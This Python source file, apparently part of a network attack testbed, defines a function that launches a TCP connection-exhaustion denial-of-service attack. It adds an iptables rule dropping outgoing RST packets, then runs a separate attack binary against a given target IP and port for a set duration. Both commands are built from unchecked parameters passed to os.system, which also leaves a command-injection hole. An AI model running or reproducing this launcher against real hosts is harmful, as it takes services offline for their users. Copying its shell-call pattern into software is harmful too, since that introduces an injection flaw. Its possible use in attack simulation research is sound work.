import os
from modules.utils import work_dir_changer as wdcm
from modules.config import env_loader as elm


def connection_exhausted_attack(attack_thread_count: int, attack_node_ip: str,
                                attacked_node_ip: str, attacked_node_port: int,
                                attack_duration: int):
    """
    连接耗尽攻击
    :param attack_thread_count: 攻击线程数量
    :param attack_node_ip: 攻击节点 ip
    :param attacked_node_ip: 被攻击节点 ip
    :param attacked_node_port: 被攻击节点端口
    :param attack_duration: 攻击时长
    :return:
    """
    # 在之前需要首先执行一条命令
    firewall_command = f"iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {attack_node_ip} -j DROP"
    os.system(firewall_command)
    attack_command = f"./connection_exhausted_attack {elm.env_loader.interface_name} {attack_thread_count} {attacked_node_ip} {attacked_node_port} {attack_duration}"
    with wdcm.WorkDirChanger(changed_work_dir="/malicious_node/modules/attacks/connection_exhausted_attack/build"):
        os.system(attack_command)
